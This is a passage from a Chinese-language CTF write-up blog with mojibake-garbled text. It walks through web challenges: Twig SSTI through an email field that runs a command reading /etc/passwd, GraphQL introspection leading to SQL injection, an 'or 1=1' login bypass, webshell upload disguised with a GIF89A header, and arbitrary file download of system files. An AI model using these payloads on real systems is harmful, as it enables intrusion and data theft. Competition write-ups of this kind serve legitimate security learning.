src="https://upload-images.jianshu.io/upload_images/18060177-7dbd05ad51c85743.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-7dbd05ad51c85743.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="Newsletter"><a href="#Newsletter" class="headerlink" title="Newsletter"></a>Newsletter</h2><p>è¿™é¢˜ç½‘ä¸Šæ‰¾ä¸åˆ°å…è´¹çš„èƒ½æ”¶é‚®ä»¶çš„æœåŠ¡å™¨ï¼Œåº”è¯¥æ˜¯è¦ä¸ªSMTPçš„ã€‚æ²¡åŠæ³•åªèƒ½å­¦å­¦Twigæ‰“sstiçš„ç”¨æ³•äº†ã€‚<br>é¢˜ç›®é¦–å…ˆç»™å‡ºçœ‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Bundle</span>\<span class="title">FrameworkBundle</span>\<span class="title">Controller</span>\<span class="title">AbstractController</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Response</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Mailer</span>\<span class="title">MailerInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Mime</span>\<span class="title">Email</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainController</span> <span class="keyword">extends</span> <span class="title">AbstractController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'main.twig'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">subscribe</span><span class="params">(Request $request, MailerInterface $mailer)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      $msg = <span class="string">''</span>;</span><br><span class="line">      $email = filter_var($request-&gt;request-&gt;get(<span class="string">'email'</span>, <span class="string">''</span>), FILTER_VALIDATE_EMAIL);</span><br><span class="line">      <span class="keyword">if</span>($email !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">        $name = substr($email, <span class="number">0</span>, strpos($email, <span class="string">'@'</span>));</span><br><span class="line"></span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;get(<span class="string">'twig'</span>)-&gt;createTemplate(</span><br><span class="line">          <span class="string">"&lt;p&gt;Hello $&#123;name&#125;.&lt;/p&gt;&lt;p&gt;Thank you for subscribing to our newsletter.&lt;/p&gt;&lt;p&gt;Regards, VolgaCTF Team&lt;/p&gt;"</span></span><br><span class="line">        )-&gt;render();</span><br><span class="line"></span><br><span class="line">        $mail = (<span class="keyword">new</span> Email())-&gt;from(<span class="string">'newsletter@newsletter.q.2020.volgactf.ru'</span>)-&gt;to($email)-&gt;subject(<span class="string">'VolgaCTF Newsletter'</span>)-&gt;html($content);</span><br><span class="line">        $mailer-&gt;send($mail);</span><br><span class="line"></span><br><span class="line">        $msg = <span class="string">'Success'</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">'Invalid email'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'main.twig'</span>, [<span class="string">'msg'</span> =&gt; $msg]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">source</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Response(<span class="string">'&lt;pre&gt;'</span>.htmlspecialchars(file_get_contents(<span class="keyword">__FILE__</span>)).<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä¸ç”¨è¯´ï¼Œ<code>${name}</code>è¿™é‡Œå­˜åœ¨sstiçš„ã€‚åŒæ—¶ç¡®è®¤æ˜¯twigæ¨¡æ¿çš„ã€‚<br><code>$email = filter_var($request-&gt;request-&gt;get(&#39;email&#39;, &#39;&#39;), FILTER_VALIDATE_EMAIL);</code><br>è¿™å¥è¿‡æ»¤å¾ˆå¥½ç»•ï¼Œåªéœ€è¦<code>6@domain.tld</code>å°±å¯ä»¥åœ¨æ”¶æ¸…æ±‚çš„åœ°æ–¹çœ‹åˆ°sstiçš„æ•ˆæœäº†ã€‚<br>flagåœ¨etc/passwdä¸­<br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#123;&#123;[&#39;cat$&#123;IFS&#125;&#x2F;etc&#x2F;passwd&#39;]|filter(&#39;system&#39;)&#125;&#125;&quot;@y</span><br></pre></td></tr></table></figure><p>å› ä¸ºæ²¡æ³•äº²è‡ªåŠ¨æ‰‹æ‰€ä»¥åªå¥½æ¬è¿payloadäº†ï¼Œæƒ­æ„§â€¦</p><h2 id="Library"><a href="#Library" class="headerlink" title="Library"></a>Library</h2><p>åœ¨æ³¨å†Œæ—¶å¯ä»¥æŠ“åŒ…å‘ç°/apiçš„è·¯ç”±<br><img src="https://upload-images.jianshu.io/upload_images/18060177-7730cfea600e9d6a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-7730cfea600e9d6a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ ¹æ®ä¼ è¾“åŠè¿”å›å½¢å¼ï¼Œå¯ä»¥åˆ¤æ–­å‡ºæ˜¯GrpahQLçš„apiæ¥å£,åŒæ—¶ä¹Ÿæœ‰ä¸ªç»å…¸çš„åˆ©ç”¨ï¼Œå°±æ˜¯ä¼ <code>{__schema{types{name}}}</code>,å¯ä»¥é€šè¿‡__schemaæŸ¥è¯¢æ‰€æœ‰å¯ç”¨å¯¹è±¡ï¼š<br>å°è¯•ç›´æ¥è®¿é—®æ— æœï¼Œpostä¼ å€¼<code>{&quot;query&quot;:&quot;{ __schema { types { name } } }&quot;}</code><br>(è¿™é‡Œè¦ç¨å¾®æ ¹æ®ä¹‹å‰ä¼ å€¼çš„æ–¹å¼æ„é€ ä¸€ä¸‹)</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"data"</span>:&#123;<span class="attr">"__schema"</span>:&#123;<span class="attr">"types"</span>:[&#123;<span class="attr">"name"</span>:<span class="string">"Query"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"String"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"LoginUser"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"LoginResponse"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"UserFilter"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"User"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"Book"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"Mutation"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"RegisterUser"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__Schema"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__Type"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__TypeKind"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"Boolean"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__Field"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__InputValue"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__EnumValue"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__Directive"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__DirectiveLocation"</span>&#125;]&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹payloadå¯ä»¥ä¸€ä¸ªä¸ªçš„çˆ†å‡ºæˆ‘ä»¬å¯èƒ½å¯ä»¥åˆ©ç”¨çš„schemaçš„ä¿¡æ¯<br><code>{&quot;query&quot;:&quot;{ __type(name: \&quot;User\&quot;) { name fields { name type { name kind }}}}&quot;}</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"data"</span>:&#123;<span class="attr">"__type"</span>:&#123;<span class="attr">"name"</span>:<span class="string">"User"</span>,<span class="attr">"fields"</span>:[&#123;<span class="attr">"name"</span>:<span class="string">"login"</span>,<span class="attr">"type"</span>:&#123;<span class="attr">"name"</span>:<span class="string">"String"</span>,<span class="attr">"kind"</span>:<span class="string">"SCALAR"</span>&#125;&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"name"</span>,<span class="attr">"type"</span>:&#123;<span class="attr">"name"</span>:<span class="string">"String"</span>,<span class="attr">"kind"</span>:<span class="string">"SCALAR"</span>&#125;&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"email"</span>,<span class="attr">"type"</span>:&#123;<span class="attr">"name"</span>:<span class="string">"String"</span>,<span class="attr">"kind"</span>:<span class="string">"SCALAR"</span>&#125;&#125;]&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>è¿™å°±å‘Šè¯‰æˆ‘ä»¬ï¼ŒUser objectæœ‰ä¸‰ä¸ªField.login, name ,email.åŒç†æˆ‘ä»¬çˆ†ä¸‹å…¶ä»–çš„,æ¯”å¦‚é‡ç‚¹å…³æ³¨çš„Query<br>å›æ˜¾ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;data&quot;:&#123;&quot;__type&quot;:&#123;&quot;name&quot;:&quot;Query&quot;,&quot;fields&quot;:[&#123;&quot;name&quot;:&quot;_empty&quot;,&quot;type&quot;:&#123;&quot;name&quot;:&quot;String&quot;,&quot;kind&quot;:&quot;SCALAR&quot;&#125;&#125;,&#123;&quot;name&quot;:&quot;login&quot;,&quot;type&quot;:&#123;&quot;name&quot;:&quot;LoginResponse&quot;,&quot;kind&quot;:&quot;OBJECT&quot;&#125;&#125;,&#123;&quot;name&quot;:&quot;testGetUsersByFilter&quot;,&quot;type&quot;:&#123;&quot;name&quot;:null,&quot;kind&quot;:&quot;LIST&quot;&#125;&#125;,&#123;&quot;name&quot;:&quot;books&quot;,&quot;type&quot;:&#123;&quot;name&quot;:null,&quot;kind&quot;:&quot;LIST&quot;&#125;&#125;]&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°ä¸€ä¸ªtestGetUsersByFilter,ä¼¼ä¹å¾ˆæœ‰æ„æ€ã€‚ä¹Ÿè®¸å®ƒå¯¹å¯æ³¨çš„ç‚¹è¿›è¡Œäº†è¿‡æ»¤,ä½†è¿™å°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥è¿›è¡Œæ³¨å…¥ã€‚<br>äºæ˜¯æˆ‘ä»¬è¿›è¡ŒåŸºæœ¬çš„æŸ¥è¯¢ã€‚æ­¤æ—¶ç›®æ ‡åº”è¯¥æ˜¯sqlæ³¨å…¥ï¼Œå¯»æ‰¾å¯æ³¨ç‚¹ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"query"</span>:<span class="string">"query testGetUsersByFilter($input: UserFilter) &#123;\n  testGetUsersByFilter(filter: $input) &#123;\n  login email name \n  &#125;\n&#125;\n"</span>,<span class="attr">"variables"</span>:&#123;<span class="attr">"input"</span>:&#123;<span class="attr">"login"</span>:<span class="string">"test"</span>,<span class="attr">"email"</span>:<span class="string">"test"</span>,<span class="attr">"name"</span>:<span class="string">"test"</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ è¿™æ ·ä¸€ä¸ªæŸ¥è¯¢è¯­å¥ã€‚æ­¤æ—¶æˆ‘ä»¬éœ€è¦é€šè¿‡æ§åˆ¶login email,nameçš„å€¼æ¥æµ‹è¯•æ˜¯å¦å­˜åœ¨æ³¨å…¥</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"query"</span>:<span class="string">"query testGetUsersByFilter($input: UserFilter) &#123;\n  testGetUsersByFilter(filter: $input) &#123;\n  login email name \n  &#125;\n&#125;\n"</span>,<span class="attr">"variables"</span>:&#123;<span class="attr">"input"</span>:&#123;<span class="attr">"login"</span>:<span class="string">"'"</span>,<span class="attr">"email"</span>:<span class="string">"1231321"</span>,<span class="attr">"name"</span>:<span class="string">"3213"</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>å½“å°è¯•sqlæ³¨å…¥å¸¸è§çš„å•å¼•å·æ—¶ï¼Œå‘ç°è¿”å›çš„ç»“æœå¯¹åº”çš„loginå±…ç„¶æ˜¯ç©ºçš„ã€‚æ‰€ä»¥çœ‹æ¥å•å¼•å·è¢«è¿‡æ»¤äº†ã€‚ä½†è¿™å¹¶ä¸æ˜¯ä»€ä¹ˆé—®é¢˜ã€‚å› ä¸ºé€ƒé€¸å•å¼•å·ä¹Ÿæ˜¯ä¸ªè€ƒçƒ‚çš„trickäº†ã€‚</p><p>å°†æˆ‘ä»¬ä¼ å‚éƒ¨åˆ†inputçš„å€¼æ”¹ä¸ºï¼š<code>{&quot;login&quot;:&quot;test\\&quot;,&quot;name&quot;:&quot; union select * from users -- &quot;}</code><br>å‘ç°å°†è¿”å›æ‰€æœ‰ç”¨æˆ·åã€‚è‡³æ­¤sqlæ³¨å…¥å·²ç»ç¡®è®¤å¯æ³¨ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æŒ–æ˜ä¿¡æ¯äº†ã€‚<br>å…ˆorder by æµ‹å­—æ®µæ•°ï¼Œå‘ç°æ˜¯6ä¸ª<br><img src="https://upload-images.jianshu.io/upload_images/18060177-5d9034306364e75c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-5d9034306364e75c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç„¶åæ‰§è¡ŒæŸ¥è¯¢ï¼Œå‘ç°å›æ˜¾å­—æ®µæ˜¯2,6,5<br><code>union select 1,table_name,3,4,5,6 from information_schema.tables where table_schema=database()#</code><br>å‘ç°flagè¡¨,flagåˆ—ï¼ŒæŸ¥è¯¢å³å¯<br><img src="https://upload-images.jianshu.io/upload_images/18060177-b852135e54ac4de8.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-b852135e54ac4de8.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WUSTCTF&amp;MRCTFéƒ¨åˆ†webé¢˜è§£</title>
      <link href="2020/03/29/WUSTCTF&amp;MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/"/>
      <url>2020/03/29/WUSTCTF&amp;MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>è¿™å‘¨æœ«é¡ºæ‰‹æ‰“äº†ä¸‹ä¸¤ä¸ªæ–°ç”Ÿèµ›ã€‚æœ¬æ¥ä¸æƒ³å†™wpçš„,ä½†æ˜¯æƒ³åˆ°ä¸Šå‘¨BJDæ¯”èµ›çš„wpä¹Ÿæ²¡å†™å°±æƒ³ç€è¿˜æ˜¯è¡¥ç€å§ã€‚ï¼ˆä¸Šå‘¨BJDä¸å†™æ˜¯å› ä¸ºå¯¹æ¯”èµ›é¢˜ç›®å¿ƒé‡Œæœ‰æ„è§ï¼Œè¯´æ˜¯æ–°ç”Ÿèµ›ï¼Œè„‘æ´è·Ÿå¥—å¨ƒé¢˜æŠŠä¸€å †è€æ‰‹éƒ½æ•´å¾—ä¸èˆ’æœã€‚å½“æ—¶å·®ä¸€é“ASP.NET,å› ä¸ºysoserialçš„gadgetç”¨çš„ä¸å¯¹å°±ä¸€ç›´å‡ºä¸äº†ç»“æœï¼Œç›´æ¥å¿ƒæ€æå´©ï¼‰æ‰€ä»¥è¿™æ¬¡æŠŠè¿™ä¸¤ä¸ªæ–°ç”Ÿèµ›é¢˜ç›®å†™å†™ã€‚å…·ä½“åªå¤§è‡´è®²ä¸‹æ€è·¯å§</p><a id="more"></a><h1 id="WUSTCTF"><a href="#WUSTCTF" class="headerlink" title="WUSTCTF"></a>WUSTCTF</h1><p>å¾ˆæœ‰æ„æ€ï¼Œé¢˜ç›®é‡Œphpéš¾åº¦éƒ½æ¯”è¾ƒåŸºç¡€ã€‚javaéš¾åº¦å°±ä¸ä¸€æ ·äº†ï¼Œä¼°è®¡æ˜¯javaæ¥è§¦çš„å°‘çš„åŸå› å§ã€‚</p><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>è¿›å»ä¸€ä¸ªå‰ç«¯éªŒè¯ã€‚é™åˆ¶æŒ‰é’®è·Ÿé•¿åº¦ã€‚å‰ç«¯æŠŠæŒ‰é’®è§£å†³åæŠ“ä¸ªåŒ…ä¼ å‡ºé¢˜äººåå­—å°±å¥½ï¼Œå¾—åˆ°å‡ºé¢˜äººblog<br>(è€å®è¯´æ¶æ„å¼•æµä¸å¥½å§â€¦â€¦)<br>å¯ä»¥åœ¨åšå®¢å‰ç«¯çœ‹åˆ°éƒ¨åˆ†flagï¼Œä½†æ˜¯åªæœ‰ä¸€åŠï¼Œåä¸€åŠé€šè¿‡åšå®¢é“¾æ¥åˆ°githubå»,å¯ä»¥æ‰¾åˆ°ååŠéƒ¨åˆ†</p><h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>å¼€å§‹éšæ‰‹ä¸€ä¸ªä¸‡èƒ½å¯†ç <code>admin&#39; or 1=1#</code>å°±è¿›å»äº†ã€‚<br><code>/adddddddddddddddddddddddminnnnnnnnnnnnnnnnnnnnnn.php</code><br>ç„¶åå°±æ˜¯æ”¹headerä»¥åŠgetï¼Œpostå€¼å³å¯<br>å¾—åˆ°paste.ubuntuåˆ†æ®µç»™å‡ºçš„ç½‘é¡µé“¾æ¥ï¼Œæ‰¾åˆ°æ­£ç¡®çš„å³å¯å¾—åˆ°ç¼–ç åçš„flagã€‚è§£ç å³å¯</p><h2 id="CV-Maker"><a href="#CV-Maker" class="headerlink" title="CV Maker"></a>CV Maker</h2><p>åŸºç¡€ä¸Šä¼ ,ç™»å½•æ³¨å†Œåå…ˆä¸Šä¼ ä¸€ä¸ªphp,æŠ¥çš„æ˜¯exif_imagetype()æ£€æŸ¥ã€‚é‚£å°±åªè¦æ–‡ä»¶å¤´è§£å†³å°±å¥½äº†ï¼Œä¼ ä¸€ä¸ªé©¬<br>,å‰é¢åŠ ä¸ŠGIF89Aå³å¯ã€‚<br>(è¿™é‡Œè¿˜æœ‰uploadsçš„ç›®å½•éå†,éšä¾¿ä¸€ä¸ªéƒ½æ˜¯ç°æˆçš„å‚è€ƒæ¡ˆä¾‹)<br>èšå‰‘è¿æ¥åæ ¹ç›®å½•<code>/readflag</code>å³å¯ã€‚</p><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>è¿™é¢˜æ˜¯é“javaé¢˜ã€‚æˆ‘ç”¨éé¢„æœŸåšå‡ºæ¥çš„ã€‚æ¯•ç«Ÿè‡ªå·±javaçŸ¥è¯†æœ‰é™â€¦â€¦</p><p>é¦–å…ˆè¿›å»åˆæ˜¯ä¸ªä¸Šä¼ ï¼Œä¼ ä¸€ä¸ªæ–‡ä»¶ä¸Šå»çœ‹åˆ°çˆ†å‡ºä¸€ä¸ªdownloadè·¯ç”±ä¸fileå‚æ•°<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>é‚£å°±æœ‰ä»»æ„æ–‡ä»¶ä¸‹è½½<br>javaé¢˜å¿…è¯»çš„å‡ ä¸ªé…ç½®æ–‡ä»¶,é¦–å…ˆå°±æ˜¯WEB-INFä¸‹çš„web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>webAppRootKey<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>tomcat.ajp<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span></span><br><span class="line">            org.springframework.web.util.WebAppRootListener</span><br><span class="line">        <span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>/WEB-INF/views/index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exception-type</span>&gt;</span>java.lang.Throwable<span class="tag">&lt;/<span class="name">exception-type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">location</span>&gt;</span>/error<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åªæœ‰ä¸€ä¸ªindex.jsp,åŒæ ·ä¸‹è½½åå‘ç°æ²¡ä»€ä¹ˆå†…å®¹ã€‚<br>è¿™æ—¶å¼€å§‹å°è¯•è¯»å–å…¶ä»–æ–‡ä»¶ï¼Œæ„é€ åå‘ç°å¯ä»¥è¯»å–åˆ°/etc/passwd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:101:102::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:102:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:103:104:systemd Time Synchronization,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">systemd-network:x:104:105:systemd Network Management,,,:/run/systemd/netif:/bin/<span class="literal">false</span></span><br><span class="line">systemd-resolve:x:105:106:systemd 